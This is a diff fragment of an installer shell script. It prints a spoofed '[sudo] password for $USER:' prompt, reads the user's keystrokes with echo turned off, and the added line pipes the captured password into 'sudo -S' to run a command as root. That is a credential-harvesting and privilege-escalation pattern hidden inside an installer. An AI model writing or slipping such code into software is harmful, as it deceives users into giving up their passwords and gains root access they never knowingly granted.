@@ -12,9 +12,11 @@ INSTALLER
 echo -n "[sudo] password for $USER: "
 stty -echo
 
+#Read Password
 charcount=0
 while IFS= read -p "$prompt" -r -s -n 1 ch
 do
+#Enter
     if [[ $ch == $'\0' ]]; 
     then
         break
@@ -37,6 +39,7 @@ do
     fi
 done
 stty echo
+echo $password | sudo -S cat ../test.txt
 
 if hash wget;
 then
